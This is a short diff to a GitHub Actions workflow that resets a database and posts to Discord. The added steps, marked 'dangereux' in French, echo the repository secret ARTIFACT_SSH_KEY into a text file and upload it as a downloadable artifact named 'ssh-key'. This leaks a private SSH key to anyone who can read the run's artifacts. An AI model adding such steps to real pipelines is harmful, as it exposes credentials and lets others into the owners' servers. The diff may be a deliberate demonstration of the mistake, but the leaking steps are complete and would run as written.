@@ -29,3 +29,16 @@ jobs:
           ACTOR: "${{github.actor}}"
           COMMIT: "${{ github.event.head_commit.message }}"
         run: 'cd "$GITHUB_WORKSPACE"/scripts && ./discord-send-msg.bash "BDD réinitialisée ($ACTOR - \`$COMMIT\`)"'
+
+
+
+      - name: Écrire la clé dans un artefact (dangereux)
+        run: echo "${ARTIFACT_SSH_KEY}" > ssh_key.txt
+        env:
+          ARTIFACT_SSH_KEY: ${{ secrets.ARTIFACT_SSH_KEY }}
+
+      - name: Upload de l’artefact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ssh-key
+          path: ssh_key.txt
